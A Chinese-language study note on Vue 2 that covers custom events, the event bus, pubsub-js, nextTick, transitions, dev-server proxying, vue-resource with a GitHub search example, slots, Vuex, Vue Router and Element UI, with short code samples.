Vue的组件自定义事件是指在组件间通信时，使用自定义事件来传递数据或者从子组件通知父组件发生了某个事件的一种方式。

1. 一种组件间通信的方式，适用于：<strong style="color:red">子组件 ===> 父组件</strong>

2. 使用场景：A是父组件，B是子组件，B想给A传数据，那么就要在A中给B绑定自定义事件（<span style="color:red">事件的回调在A中</span>）。

3. 绑定自定义事件：

4. 第一种方式，在父组件中：```<Demo @atguigu="test"/>```或 ```<Demo v-on:atguigu="test"/>```

5. 第二种方式，在父组件中：

   ```js
   <Demo ref="demo"/>
   ......
   mounted(){
      this.$refs.xxx.$on('atguigu',this.test)
   }
   ```

6. 若想让自定义事件只能触发一次，可以使用once修饰符，或$once方法。

7. 触发自定义事件：this.$emit('atguigu',数据)

8. 解绑自定义事件this.$off('atguigu')

9. 组件上也可以绑定原生DOM事件，需要使用native修饰符。

10. 注意：通过this.$refs.xxx.$on('atguigu',回调)绑定自定义事件时，回调<span style="color:red">要么配置在methods中</span>，<span style="color:red">要么用箭头函数</span>，否则this指向会出问题！

- 定义自定义事件：在子组件中通过 $emit 方法定义一个自定义事件

```js
<template>
  <button @click="emitEvent">Emit Custom Event</button>
</template>

<script>
export default {
  methods: {
    emitEvent() {
      this.$emit('custom-event', 'This is a custom event');
    }
  }
}
</script>
```

- 使用自定义事件：在父组件中，通过给子组件绑定自定义事件，监听到子组件触发的事件，通过这种方式，子组件和父组件之间就可以通过自定义事件来进行通信了

```js
<template>
  <child-component @custom-event="eventHandler"></child-component>
</template>

<script>
import ChildComponent from './ChildComponent';

export default {
  components: {
    ChildComponent
  },
  methods: {
    eventHandler(data) {
      console.log(data);
    }
  }
}
</script>
```

### 全局事件总线

Vue的全局事件总线是一个事件订阅/发布系统，允许在不直接相关的组件之间进行通信。通常，组件之间的通信是通过父子关系或者混入来实现的，但是有时组件之间的关系可能比较复杂，需要更为灵活的通信方式。

全局事件总线可以用于解决跨组件的通信问题，并且对于组件的结构和职责关系没有影响。但是，使用全局事件总线需要注意，它可能导致代码难以维护，因为在多个组件中发布和订阅事件可能需要更多的代码和维护。因此，使用全局事件总线需要谨慎考虑。

使用全局事件总线的方法如下：

- 实例化一个 Vue 实例作为事件总线：

```js
// 实例化一个 Vue 实例作为事件总线
var bus = new Vue();
```

- 使用 $emit 方法发布事件：

```js
bus.$emit('eventName', eventData);
```

- 使用 $on 方法订阅事件：

```js
bus.$on('eventName', function(eventData) {
  // 处理事件
});
```

### 消息订阅与发布

- Vue提供了一种简单的方式来处理跨组件的数据通信，这种方式称为消息订阅与发布。

- 在消息订阅与发布模式中，一个组件可以发布消息，另一个组件可以订阅消息。当订阅的组件需要使用该消息时，它就可以在特定的事件中触发。

- pubsub-js 是一个发布/订阅消息库，它允许您实现 JavaScript 应用程序中的消息通信。发布者可以发布消息，订阅者可以通过订阅特定主题来接收它们。这种方法是一种解耦技术，可以让组件以更简洁的方式进行通信。安装命令 npm i pubsub-js，在终端执行即可，使用该库时记得使用import导入

- 使用`pubsub-js`可以方便地解决多个模块之间的消息传递问题，并且代码实现较为简单。使用方法：

  - 发布消息

  ```js
  var PubSub = require('pubsub-js');
  PubSub.publish('messageName', data);
  ```

  - 订阅消息

  ```js
  var PubSub = require('pubsub-js');
  var token = PubSub.subscribe('messageName', function(msg, data){
    console.log(msg, data);
  });
  ```

  - 取消订阅

  ```js
  PubSub.unsubscribe(token);
  ```

### nextTick

nextTick是Vue.js的一个异步函数，用于在下一次 DOM 更新循环结束之后执行延迟回调。这对于某些需要在状态更改后操作 DOM 的场景非常有用，通过使用 `nextTick` 函数，您可以在 DOM 完成更新后执行回调，而不是在状态更改后立即执行。

- 语法：this.$nextTick(回调函数)

- 作用：在下一次 DOM 更新结束后执行其指定的回调。

- 什么时候用：当改变数据后，要基于更新后的新DOM进行某些操作时，要在nextTick所指定的回调函数中执行。

```js
// 修改数据
this.message = 'Hello'

// DOM 还没有更新
this.$nextTick(function () {
  // DOM 已经更新
})
```

### 动画效果

Vue 可以使用内置的动画系统，以简单和强大的方式创建动画效果。

Vue 提供了两种创建动画的方法：

- 利用 transition 组件：可以通过为组件或元素添加 v-if 和 v-show 指令来实现动画。

- 利用动画组件：可以在组件中定义动画并使用 JavaScript 控制动画的过程。

你可以在 Vue 组件中定义 CSS 动画，然后在 JavaScript 代码中使用 v-on 指令来触发这些动画。Vue 还提供了关键帧动画支持，可以更灵活地定义动画。

动画写法：

1. 准备好样式：

- 元素进入的样式：
  1. v-enter：进入的起点
  2. v-enter-active：进入过程中
  3. v-enter-to：进入的终点
- 元素离开的样式：
  1. v-leave：离开的起点
  2. v-leave-active：离开过程中
  3. v-leave-to：离开的终点

2. 使用```<transition>```包裹要过度的元素，并配置name属性：

   ```js
   <transition name="hello">
      <h1 v-show="isShow">你好啊！</h1>
   </transition>
   ```

3. 备注：若有多个元素需要过度，则需要使用：```<transition-group>```，且每个元素都要指定```key```值。

- 第三方CSS动画库（Animate.css）

网址：https://animate.style/

命令：npm install animate.css --save，在终端执行该命令下载该库，里面有许多动画效果，可供选择，根据官方文档说明进行操作即可

```js
<template>
	<div>
		<button @click="isShow = !isShow">显示/隐藏</button>
        //使用第三方库的动画效果例子，不需要自己写CSS动画
        //直接使用下面的属性key=“value”
        //value为官方里的某个动画名
		<transition-group 
			appear
			name="animate__animated animate__bounce" 
			enter-active-class="animate__swing"
			leave-active-class="animate__backOutUp"
		>
			<h1 v-show="!isShow" key="1">你好啊！</h1>
			<h1 v-show="isShow" key="2">尚硅谷！</h1>
		</transition-group>
	</div>
</template>

<script>
	import 'animate.css'
	export default {
		name:'Test',
		data() {
			return {
				isShow:true
			}
		},
	}
</script>

<style scoped>
	h1{
		background-color: orange;
	}

</style>
```

# Vue中的Ajax

## Ajax的跨域问题

开发环境下，前端项目通常运行在一个不同的域名或端口下，而后端 API 接口又运行在另一个域名或端口下，因此可能会遇到跨域问题。解决开发环境下的跨域问题，可以通过以下几种方式：

1. 配置代理服务器：在 vue.config.js 或者 webpack.config.js中配置一个代理服务器，将前端请求转发到后端服务器，以解决跨域问题。
2. 使用 JSONP：通过 JSONP 跨域请求数据，JSONP 原理是利用 `<script>` 标签不受同源策略的限制，动态添加 `<script>` 标签来获取数据。
3. 启用浏览器的跨域资源共享（CORS）功能：如果后端 API 支持跨域资源共享，那么可以在请求头中加上 Origin 字段，并在响应头中添加 Access-Control-Allow-Origin 字段，以允许前端访问后端 API。
4. 使用反向代理：在开发环境中可以使用 Nginx、Apache 等反向代理服务器，将前端请求转发到后端服务器，以解决跨域问题。

以上几种方式各有优缺点，开发者可以根据实际需求选择适合自己的方式。

## 配置代理服务器

Vue可以通过配置一个代理服务器来解决跨域请求的问题。要配置代理服务器，可以在 vue.config.js 文件中使用 devServer选项，如下所示：

```js
module.exports = {
  devServer: {
    proxy: {
      '/api': {
        target: 'http://api.example.com',
        changeOrigin: true,
        pathRewrite: {
          '^/api': ''
        }
      }
    }
  }
}
```

以上代码中，proxy 选项用于配置代理服务器，其中 /api 是需要代理的请求路径，target 是要代理到的目标服务器地址。changeOrigin 选项用于修改请求头中的 Origin 字段，以便服务器正确识别请求的来源。pathRewrite 选项用于重写请求路径，以去掉 /api 前缀。

使用上述配置后，Vue 开发服务器会将所有以 /api 开头的请求转发到 `http://api.example.com`。例如，如果你的应用发起一个请求 `http://localhost:8080/api/data`，则实际请求的地址会是 `http://api.example.com/data`。

## vue-resource

命令：npm i vue-resource，在终端输入该命令下载

vue-resource 是一个基于 Vue.js 的 HTTP 库，可以方便地进行 HTTP 请求和响应处理。它提供了丰富的特性，包括：

- 拦截器：可以在请求和响应过程中添加拦截器，用于处理请求头、响应状态码等信息。
- Promise API：支持 Promise 链式调用，使得异步操作更加方便。
- 组件内 HTTP：可以在 Vue 组件中方便地使用 $http 对象来发起 HTTP 请求。
- 请求取消：可以通过 cancel 方法来取消请求。
- 跨域支持：可以在配置中添加跨域请求的相关配置。

vue-resource 目前已经不再维护，官方推荐使用 axios 或者 fetch 进行 HTTP 请求处理。

### 小案例

Github的搜索小案例，接口地址：https://api.github.com/search/users?q=xxx

- List.vue

```js
<template>
	<div class="row">
		<!-- 展示用户列表 -->
		<div v-show="info.users.length" class="card" v-for="user in info.users" :key="user.login">
			<a :href="user.html_url" target="_blank">
				<img :src="user.avatar_url" style='width: 100px'/>
			</a>
			<p class="card-text">{{user.login}}</p>
		</div>
		<!-- 展示欢迎词 -->
		<h1 v-show="info.isFirst">欢迎使用！</h1>
		<!-- 展示加载中 -->
		<h1 v-show="info.isLoading">加载中....</h1>
		<!-- 展示错误信息 -->
		<h1 v-show="info.errMsg">{{info.errMsg}}</h1>
	</div>
</template>

<script>
	export default {
		name:'List',
		data() {
			return {
				info:{
					isFirst:true,
					isLoading:false,
					errMsg:'',
					users:[]
				}
			}
		},
		mounted() {
			this.$bus.$on('updateListData',(dataObj)=>{
				this.info = {...this.info,...dataObj}
			})
		},
	}
</script>

<style scoped>
	.album {
		min-height: 50rem; /* Can be removed; just added for demo purposes */
		padding-top: 3rem;
		padding-bottom: 3rem;
		background-color: #f7f7f7;
	}

	.card {
		float: left;
		width: 33.333%;
		padding: .75rem;
		margin-bottom: 2rem;
		border: 1px solid #efefef;
		text-align: center;
	}

	.card > img {
		margin-bottom: .75rem;
		border-radius: 100px;
	}

	.card-text {
		font-size: 85%;
	}
</style>
```

- Search.vue

```js
<template>
	<section class="jumbotron">
		<h3 class="jumbotron-heading">Search Github Users</h3>
		<div>
			<input type="text" placeholder="enter the name you search" v-model="keyWord"/>&nbsp;
			<button @click="searchUsers">Search</button>
		</div>
	</section>
</template>

<script>
	export default {
		name:'Search',
		data() {
			return {
				keyWord:''
			}
		},
		methods: {
			searchUsers(){
				//请求前更新List的数据
				this.$bus.$emit('updateListData',{isLoading:true,errMsg:'',users:[],isFirst:false})
				this.$http.get(`https://api.github.com/search/users?q=${this.keyWord}`).then(
					response => {
						console.log('请求成功了')
						//请求成功后更新List的数据
						this.$bus.$emit('updateListData',{isLoading:false,errMsg:'',users:response.data.items})
					},
					error => {
						//请求后更新List的数据
						this.$bus.$emit('updateListData',{isLoading:false,errMsg:error.message,users:[]})
					}
				)
			}
		},
	}
</script>
```

- App.vue

```js
<template>
	<div class="container">
		<Search/>
		<List/>
	</div>
</template>

<script>
	import Search from './components/Search'
	import List from './components/List'
	export default {
		name:'App',
		components:{Search,List}
	}
</script>
```

- main.js

```js
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'
//引入插件
import vueResource from 'vue-resource'
//关闭Vue的生产提示
Vue.config.productionTip = false
//使用插件
Vue.use(vueResource)

//创建vm
new Vue({
	el:'#app',
	render: h => h(App),
	beforeCreate() {
		Vue.prototype.$bus = this
	},
})
```

## 插槽

- Vue 中的插槽（Slot）是一种机制，用于在组件中预留一些内容的位置，让父组件可以向子组件中传递任意的 HTML 内容。通过插槽，我们可以更加灵活地组合组件，并可以将组件的复用性和可维护性提高到一个新的层次。

- Vue 的插槽分为具名插槽和默认插槽两种类型。具名插槽可以在父组件中根据插槽名来向子组件传递内容，而默认插槽则是在父组件没有提供具名插槽的情况下，将内容传递给子组件的默认位置。

### 默认插槽

默认插槽是Vue中插槽的一种类型，用于在组件中插入父组件的内容。如果父组件没有提供内容，那么默认插槽中的内容就会显示出来。

默认插槽可以通过 `<slot>` 标签来定义，在子组件中使用。

在下面的示例中，子组件定义了一个默认插槽，它包含了一个默认内容。父组件使用 `<my-component>` 标签来引入子组件，并将一个 `<p>` 标签作为默认插槽的内容传递给子组件。因此，在父组件中渲染子组件时，子组件会显示传递的 `<p>` 标签，而不是默认内容。

默认插槽也支持具名插槽的使用方式，可以在 `<slot>` 标签中指定插槽名称来定义具名插槽，如 `<slot name="header">`，然后在父组件中使用 `<template>` 标签和 `v-slot` 指令来向具名插槽传递内容。

下面是一个简单的例子：

```js
<!-- 子组件 -->
<template>
  <div>
    <h1>子组件</h1>
    <!-- 定义一个默认插槽 -->
    <slot>
      <!-- 默认插槽的默认内容 -->
      <p>这是默认插槽的默认内容</p>
    </slot>
  </div>
</template>

<!-- 父组件 -->
<template>
  <div>
    <h1>父组件</h1>
    <!-- 使用默认插槽 -->
    <my-component>
      <!-- 传递默认插槽的内容 -->
      <p>这是默认插槽的内容</p>
    </my-component>
  </div>
</template>

<script>
import MyComponent from './MyComponent.vue'

export default {
  name: 'ParentComponent',
  components: {
    MyComponent,
  },
}
</script>
```

### 具名插槽

具名插槽是Vue中插槽的一种类型，与默认插槽不同，具名插槽可以用于在组件中插入多个不同的内容。

具名插槽可以通过在 `<slot>` 标签中指定 `name` 属性来定义，如 `<slot name="header">`。在使用具名插槽时，可以在父组件中使用 `<template>` 标签和 `v-slot` 指令来指定传递给具名插槽的内容，如 `<template v-slot:header>`。

在下面的示例中，子组件定义了两个具名插槽，一个名为 `header`，另一个名为 `footer`，并分别提供了默认内容。父组件使用 `<my-component>` 标签来引入子组件，并使用 `<template>` 标签和 `v-slot` 指令向具名插槽传递不同的内容，其中 `v-slot:header` 表示向名为 `header` 的插槽传递内容，`v-slot:footer` 同理。

在父组件中，具名插槽可以像普通HTML标签一样使用，可以添加属性、嵌套元素等，这些内容会被传递到子组件中对应的具名插槽位置，覆盖默认内容。

下面是一个使用具名插槽的示例：

```js
<!-- 子组件 -->
<template>
  <div>
    <h1>子组件</h1>
    <!-- 定义两个具名插槽 -->
    <slot name="header">
      <!-- 头部插槽的默认内容 -->
      <p>这是头部插槽的默认内容</p>
    </slot>
    <slot name="footer">
      <!-- 底部插槽的默认内容 -->
      <p>这是底部插槽的默认内容</p>
    </slot>
  </div>
</template>

<!-- 父组件 -->
<template>
  <div>
    <h1>父组件</h1>
    <!-- 使用具名插槽 -->
    <my-component>
      <!-- 向头部插槽传递内容 -->
      <template v-slot:header>
        <p>这是头部插槽的内容</p>
      </template>
      <!-- 向底部插槽传递内容 -->
      <template v-slot:footer>
        <p>这是底部插槽的内容</p>
      </template>
    </my-component>
  </div>
</template>

<script>
import MyComponent from './MyComponent.vue'

export default {
  name: 'ParentComponent',
  components: {
    MyComponent,
  },
}
</script>
```

### 作用域插槽

作用域插槽（Scoped Slots）是 Vue 中插槽的一种特殊类型，与默认插槽和具名插槽不同，它可以将插槽内部的数据传递到父组件中。作用域插槽可以在子组件中定义，并在父组件中使用。

作用域插槽通过 `slot-scope` 特性来定义，其中 `slot-scope` 的值是一个变量名，可以用于引用插槽内部的数据。在父组件中，可以使用 `<template>` 标签和 `v-slot` 指令来使用作用域插槽，并将子组件中传递的数据渲染到模板中。

在下面的示例中，子组件定义了一个作用域插槽，并将一个 `item` 变量传递到插槽内部。在父组件中，使用 `<template>` 标签和 `v-slot` 指令来引用作用域插槽，并使用 `slotProps` 变量来引用插槽内部的数据，渲染到模板中。

在父组件中，可以将作用域插槽的变量用于计算、渲染列表等操作。通过作用域插槽，子组件可以向父组件提供更加灵活的数据传递方式，增加组件的复用性。

下面是一个使用作用域插槽的示例：

```js
<!-- 子组件 -->
<template>
  <div>
    <h1>子组件</h1>
    <!-- 定义一个作用域插槽 -->
    <slot name="content" v-bind:item="item">
      <!-- 插槽的默认内容 -->
      <p>{{ item }}</p>
    </slot>
  </div>
</template>

<!-- 父组件 -->
<template>
  <div>
    <h1>父组件</h1>
    <!-- 使用作用域插槽 -->
    <my-component>
      <template v-slot:content="slotProps">
        <!-- 渲染子组件传递的数据 -->
        <p>{{ slotProps.item }}</p>
      </template>
    </my-component>
  </div>
</template>

<script>
import MyComponent from './MyComponent.vue'

export default {
  name: 'ParentComponent',
  components: {
    MyComponent,
  },
  data() {
    return {
      items: ['item1', 'item2', 'item3'],
    }
  },
}
</script>
```

# Vuex简单的认识

Vuex 是一个专为 Vue.js 应用程序开发的状态管理模式和库。它可以用来集中管理应用程序中的共享状态，如用户信息、购物车、主题等。在实际开发中，如果应用程序中的状态变得非常复杂，推荐使用 Vuex 来进行管理，以提高应用程序的可维护性和可扩展性。

Vuex 应用程序中的状态通常包括三个部分：

1. state：包含应用程序中所有共享的数据（状态）。
2. mutations：一些同步函数，用于改变 state 的值。
3. actions：包含一些异步函数，用于提交 mutations，同时可以包含任意异步操作。

Vuex 的工作流程如下：

1. 组件调用 action 中的函数。
2. action 函数提交 mutation。
3. mutation 函数改变 state 的值。
4. state 的值的改变会自动更新应用程序中的组件。

[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-u2jSUOBr-1679118232468)(null)]

使用 Vuex，可以使应用程序中的状态变得更加清晰和易于维护。同时，Vuex 还提供了丰富的插件和工具，如 time-travel 调试器和 action 插件，可以更加方便地调试和优化应用程序。

在下面的示例中，定义了一个名为 "store" 的 Vuex 对象，包含了 state、mutations 和 actions 三个部分。其中，state 中定义了一个名为 "count" 的状态，mutations 中定义了一个名为 "increment" 的同步函数，actions 中定义了一个名为 "incrementAsync" 的异步函数。在组件中可以通过 this.$store.state.count 来获取 state 中的值，或者通过 this.$store.commit('increment') 来提交一个 mutation，或者通过 this.$store.dispatch('incrementAsync') 来执行一个异步操作。

下面是一个简单的 Vuex 应用程序示例：使用命令：npm i vuex，这是默认下载vuex的最新版本vuex4，但它只是配于vue3，不能用于vue2，要注意，想要配置vue2环境的vuex，则想要下载vuex3才行，命令为npm i vuex@3

```js
import Vue from 'vue'
//引入vuex
import Vuex from 'vuex'
//使用插件
Vue.use(Vuex)

const store = new Vuex.Store({
  state: {
    count: 0,
  },
  mutations: {
    increment(state) {
      state.count++
    },
  },
  actions: {
    incrementAsync(context) {
      setTimeout(() => {
        context.commit('increment')
      }, 1000)
    },
  },
})

export default store
```

#  Vue路由

什么是路由？

- 路由是指根据 URL 的不同，显示不同的内容或页面。在前端开发中，路由主要用于实现单页应用（Single Page Application，SPA）。

- 一个路由就是一组映射关系（key - value）

- key 为路径, value 可能是 function 或 component

对 SPA 应用的理解

- 单页 Web 应用（single page web application，SPA）。

- 整个应用只有**一个完整的页面**。

- 点击页面中的导航链接**不会刷新**页面，只会做页面的**局部更新。**

- 数据需要通过 ajax 请求获取。

Vue.js 官方提供了一个路由管理器 Vue Router，它能够让我们方便地进行路由管理。在 Vue Router 中，我们可以定义路由、配置路由参数，以及进行路由导航等操作。

在 Vue Router 中，我们通常需要进行以下几个步骤：

1. 安装 Vue Router：通过 `npm install vue-router` 命令进行安装。
2. 定义路由：在路由文件中定义路由，并将其作为 Vue 实例的选项之一进行配置。
3. 渲染视图：在 Vue 实例中使用 `<router-view>` 标签渲染视图。
4. 导航：使用 `<router-link>` 标签或编程式导航进行路由跳转。

几个注意点

1. 路由组件通常存放在```pages```文件夹，一般组件通常存放在```components```文件夹。
2. 通过切换，“隐藏”了的路由组件，默认是被销毁掉的，需要的时候再去挂载。
3. 每个组件都有自己的```$route```属性，里面存储着自己的路由信息。
4. 整个应用只有一个router，可以通过组件的```$router```属性获取到。

配置路由规则，使用children配置项：

```js
   routes:[
   	{
   		path:'/about',
   		component:About,
   	},
   	{
   		path:'/home',
   		component:Home,
   		children:[ //通过children配置子级路由
   			{
   				path:'news', //此处一定不要写：/news
   				component:News
   			},
   			{
   				path:'message',//此处一定不要写：/message
   				component:Message
   			}
   		]
   	}
   ]
```

在下面的示例中，首先引入了 Vue、Vue Router 和 App 组件、Home 组件、About 组件。然后定义了路由，包含两个路径 '/' 和 '/about'，分别对应 Home 和 About 组件。接着创建了一个 VueRouter 对象，将定义的路由传入，并在 Vue 实例中进行配置，同时在模板中使用 `<router-view>` 标签来渲染视图。

通过这样的方式，我们就可以在应用程序中进行路由跳转了，比如在组件中使用 `<router-link>` 标签，或者使用编程式导航 `this.$router.push('/')`。

下面是一个简单的 Vue Router 示例：

```js
// main.js
import Vue from 'vue'
import VueRouter from 'vue-router'
import App from './App.vue'
import Home from './components/Home.vue'
import About from './components/About.vue'

Vue.use(VueRouter)

const routes = [
  { path: '/', component: Home },
  { path: '/about', component: About },
]

const router = new VueRouter({
  routes,
})

new Vue({
  router,
  render: h => h(App),
}).$mount('#app')
```

## router-link

`router-link` 是 Vue.js 官方提供的组件，用于实现在 Vue.js 应用中的路由跳转。

在 Vue.js 中，如果要跳转到某个路由，可以使用 `<router-link>` 组件来实现。`<router-link>` 组件会渲染一个可点击的链接，并在点击时触发路由跳转。

使用 `<router-link>` 组件需要传递一个 `to` 属性，用于指定跳转的目标路由。`to` 属性的值可以是一个字符串，也可以是一个路由对象，具体的取值方式可以参考 `vue-router` 文档。

当然，`<router-link>` 组件还可以设置其他属性，比如可以设置 `target` 属性来指定链接的打开方式，可以设置 `active-class` 属性来指定链接激活时的 CSS 类名等。详细的使用方法可以参考 `vue-router` 的官方文档。

在下面的代码中，通过在模板中使用 `<router-link>` 标签，可以生成两个可点击的链接，分别对应了 `/` 和 `/about` 两个路由。当用户点击这两个链接时，就会自动触发路由跳转到对应的页面。

下面是一个简单的 `<router-link>` 组件的使用示例：

```js
<template>
  <div>
    <router-link to="/">Home</router-link>
    <router-link to="/about">About</router-link>
  </div>
</template>
```

## router-view

`<router-view>` 是 Vue.js 官方提供的组件，用于根据当前路由匹配的组件动态地渲染到对应的位置。

在 Vue.js 应用中，一般会使用多个组件来分别表示不同的页面，然后通过路由来动态切换这些组件。使用 `<router-view>` 组件可以将这些组件动态渲染到对应的位置。当切换路由时，`<router-view>` 组件会根据当前路由匹配的组件来动态渲染到对应的位置。

当然，`<router-view>` 组件还可以设置其他属性，比如可以设置 `name` 属性来指定命名视图，可以设置 `keep-alive` 属性来缓存组件等。详细的使用方法可以参考 `vue-router` 的官方文档。

下面是一个简单的 `<router-view>` 组件的使用示例：

在下面的代码中，首先定义了一个包含三个路由链接的导航栏。每个链接都使用 `<router-link>` 组件来实现，其中 `to` 属性用来指定链接的目标路由。

接着，在组件的模板中使用了 `<router-view>` 组件来占位显示匹配的路由组件。当用户点击导航栏中的链接时，`vue-router` 会根据链接中的目标路由来动态地渲染对应的组件，并将其渲染到 `<router-view>` 组件的位置上。

注意，上述代码中只是为了演示 `<router-view>` 的使用方法，实际上还需要在 `router/index.js` 中定义各个路由的组件和路径等信息。具体的使用方法可以参考 `vue-router` 的官方文档。

```js
<template>
  <div>
    <h1>My App</h1>
    <nav>
      <router-link to="/">Home</router-link>
      <router-link to="/about">About</router-link>
      <router-link to="/contact">Contact</router-link>
    </nav>
    <router-view></router-view>
  </div>
</template>
```

## 路由守卫

路由守卫是 `vue-router` 提供的一些方法，可以在路由切换的不同阶段进行一些拦截和操作。常用的路由守卫包括全局前置守卫 `beforeEach`、全局后置钩子 `afterEach` 和路由独享守卫 `beforeEnter`。

- `beforeEach`: 全局前置守卫，在路由切换前调用，可以用来进行路由权限验证、全局拦截等操作。
- `afterEach`: 全局后置钩子，在路由切换完成后调用，可以用来进行页面统计、全局错误处理等操作。
- `beforeEnter`: 路由独享守卫，只作用于当前路由，在进入该路由前调用，可以用来进行该路由的权限验证等操作。

下面是一个使用 `beforeEach` 守卫的示例：

```js
import router from './router'
import store from './store'

router.beforeEach((to, from, next) => {
  if (to.meta.requiresAuth && !store.state.user) {
    next('/login')
  } else {
    next()
  }
})
```

在上面的代码中，我们使用 `beforeEach` 守卫对需要进行身份验证的路由进行拦截。如果用户未登录，则跳转到登录页面；否则，继续进行路由跳转。

需要注意的是，在 `beforeEach` 守卫中，可以通过 `next` 方法来控制路由跳转行为。如果调用 `next` 方法，表示允许路由跳转；如果传递一个路由路径，表示取消当前跳转并跳转到指定路由。

## 独享路由

在 `vue-router` 中，独享路由指的是只对某个路由生效的守卫。和全局守卫不同，独享路由守卫只会在当前路由的跳转过程中被触发。常见的独享路由守卫包括 `beforeEnter` 和组件内的 `beforeRouteEnter` 和 `beforeRouteLeave` 等。

以 `beforeEnter` 守卫为例，下面是一个简单的使用示例：

```js
const router = new VueRouter({
  routes: [
    {
      path: '/user/:id',
      component: User,
      beforeEnter: (to, from, next) => {
        if (to.params.id === 'admin') {
          next('/')
        } else {
          next()
        }
      }
    }
  ]
})
```

在上面的示例中，我们为 `User` 组件配置了一个路由 `/user/:id`，并为该路由配置了一个 `beforeEnter` 守卫。在守卫中，我们根据 `to` 对象中的参数 `id` 进行判断，如果 `id` 为 `'admin'`，则取消当前路由跳转并跳转到首页；否则，继续进行路由跳转。

需要注意的是，在独享路由守卫中，`this` 指向的是 `undefined`，因此无法访问到组件实例，如果需要访问组件实例，则需要使用组件内的 `beforeRouteEnter` 守卫。

## 管理路由

在 Vue Router 中，有两种模式可以用于管理路由：hash 模式和 history 模式。

hash模式：

1. 地址中永远带着#号，不美观 。
2. 若以后将地址通过第三方手机app分享，若app校验严格，则地址会被标记为不合法。
3. 兼容性较好。

history模式：

1. 地址干净，美观 。
2. 兼容性和hash模式相比略差。
3. 应用部署上线时需要后端人员支持，解决刷新页面服务端404的问题。

### history模式

其中，history 模式基于 HTML5 的 history API，它可以在不刷新页面的情况下改变 URL，从而实现前端路由的跳转。启用 history 模式很简单，只需要在创建 `VueRouter` 实例时，将 `mode` 配置项的值设置为 `'history'` 即可。示例代码如下：

```js
const router = new VueRouter({
  mode: 'history',
  routes: [
    // ...
  ]
})
```

在使用 history 模式时，需要在后端服务器配置，以确保用户在刷新页面或者直接访问特定路由时能够正常访问到前端路由对应的页面。具体来说，当用户在浏览器地址栏中直接访问特定路由时，后端服务器应该始终返回前端应用的入口 HTML 文件，让前端路由接管页面的跳转。通常，可以使用 URL 重写技术来实现这一点。

需要注意的是，当使用 history 模式时，需要确保服务端支持 HTML5 history API。如果用户使用的是比较老的浏览器，或者使用了某些浏览器插件，可能会导致 history 模式失效，此时可以考虑使用 hash 模式作为备选方案。

### hash模式

在 Vue.js 中，路由默认使用的是 hash 模式（也叫做哈希模式）。在 hash 模式下，URL 中的 `#` 符号前面的部分表示真实的 URL 地址，而 `#` 符号后面的部分则表示当前路由的路径。

使用 hash 模式的优点在于，不需要服务器端进行额外的配置，可以直接在前端进行路由管理。同时，由于 hash 会被浏览器自动忽略，因此不会对 SEO（搜索引擎优化）产生负面影响。

要使用 hash 模式，只需要在创建路由器实例时，将 `mode` 属性设置为 `'hash'`，如下所示：

```js
import VueRouter from 'vue-router';

const router = new VueRouter({
  mode: 'hash',
  routes: [
    // 路由配置
  ]
});
```

当然，如果不想在 URL 中显示 `#` 符号，也可以使用 HTML5 的 history 模式，通过修改浏览器的历史记录，实现类似的效果。

# UI组件库

在 Vue.js 中，可以使用第三方的 UI 组件库来快速搭建前端页面，常用的 UI 组件库包括：

- Element UI：由饿了么团队开发的一套基于 Vue.js 的 UI 组件库，提供了大量的组件和模板，支持响应式布局和多语言等特性。

- Ant Design Vue：由 Ant Design 团队开发的基于 Vue.js 的 UI 组件库，提供了丰富的组件和模板，支持国际化和主题定制等功能。

- Vuetify：一个基于 Material Design 设计语言的 UI 组件库，提供了一系列的组件和样式，支持响应式布局和主题定制等特性。

- Bootstrap Vue：一个基于 Bootstrap 4 和 Vue.js 的 UI 组件库，提供了一系列的组件和样式，支持响应式布局和主题定制等特性。

- Ivy UI：一个基于 Vue 3 的 UI 组件库，提供了一系列的组件和样式，支持 Tree Shaking 和主题定制等特性。

这些 UI 组件库都提供了丰富的组件和模板，可以根据需求选择合适的组件库进行使用。同时，由于 Vue.js 本身的灵活性和可扩展性，也可以根据自己的需求进行二次开发，定制符合自己需求的 UI 组件。

移动端常用 UI 组件库

- Vant： https://youzan.github.io/vant

- Cube UI： https://didi.github.io/cube-ui

- Mint UI： http://mint-ui.github.io

PC 端常用 UI 组件库

- Element UI： https://element.eleme.cn

- IView UI：https://www.iviewui.com

## Element UI

官方文档使用说明：https://element.eleme.cn/#/zh-CN/component/quickstart

Element UI 是一套基于 Vue.js 2.0 的 UI 组件库，由饿了么前端团队开发维护，提供了丰富的组件和模板，支持响应式布局和多语言等特性。

Element UI 的组件包括按钮、表单、表格、弹窗、日期选择器、下拉框、菜单、分页等，支持自定义主题和样式，也支持按需加载和 Tree Shaking 等功能，可以根据需求进行灵活配置和定制。

Element UI 的使用非常简单，只需要在项目中引入 Element UI 的 CSS 和 JS 文件，然后按照文档中的示例使用相应的组件即可。Element UI 的文档非常详细，也提供了丰富的示例和 API 文档，方便开发者进行使用和扩展。

例子：由于该库有太多组件了，参考官方文档进行按需引入组件

- main.js

```js
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'

//完整引入
//引入ElementUI组件库
// import ElementUI from 'element-ui';
//引入ElementUI全部样式
// import 'element-ui/lib/theme-chalk/index.css';

//按需引入
import { Button,Row,DatePicker } from 'element-ui';

//关闭Vue的生产提示
Vue.config.productionTip = false

//应用ElementUI
// Vue.use(ElementUI);
Vue.component('atguigu-button', Button);
Vue.component('atguigu-row', Row);
Vue.component('atguigu-date-picker', DatePicker);

//创建vm
new Vue({
  el:'#app',
  render: h => h(App),
})
```

- App.js

```js
<template>
  <div>
    <button>原生的按钮</button>
    <input type="text">
      <atguigu-row>
        <el-button>默认按钮</el-button>
        <el-button type="primary">主要按钮</el-button>
        <el-button type="success">成功按钮</el-button>
        <el-button type="info">信息按钮</el-button>
        <el-button type="warning">警告按钮</el-button>
        <el-button type="danger">危险按钮</el-button>
      </atguigu-row>
      <atguigu-date-picker
              type="date"
              placeholder="选择日期">
      </atguigu-date-picker>
      <atguigu-row>
        <el-button icon="el-icon-search" circle></el-button>
        <el-button type="primary" icon="el-icon-s-check" circle></el-button>
        <el-button type="success" icon="el-icon-check" circle></el-button>
        <el-button type="info" icon="el-icon-message" circle></el-button>
        <el-button type="warning" icon="el-icon-star-off" circle></el-button>
        <el-button type="danger" icon="el-icon-delete" circle></el-button>
      </atguigu-row>
  </div>
</template>

<script>
  export default {
  name:'App',
}
</script>
```


